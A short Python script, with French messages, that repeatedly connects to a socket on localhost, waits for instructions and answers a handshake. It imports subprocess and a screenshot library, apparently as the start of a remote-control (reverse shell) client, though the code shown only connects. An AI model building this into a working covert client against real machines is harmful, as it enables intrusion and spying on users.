import socket
import time
import subprocess
import os
import platform
from PIL import ImageGrab

HOST_IP = "127.0.0.1"
HOST_PORT = 32000
MAX_DATA_SIZE = 1024

while True:
    # time.sleep(1)
    try:
        s = socket.socket()
        print(f"Connexion a {HOST_IP} port: {HOST_PORT}")
        s.connect((HOST_IP, HOST_PORT))
    except:
        print("Erreur de connexion")
        time.sleep(3)
    else:
        print("Attente d'instructions")
        # break

        print(s.recv(5).decode("utf-8"))
        s.sendall("it".encode())
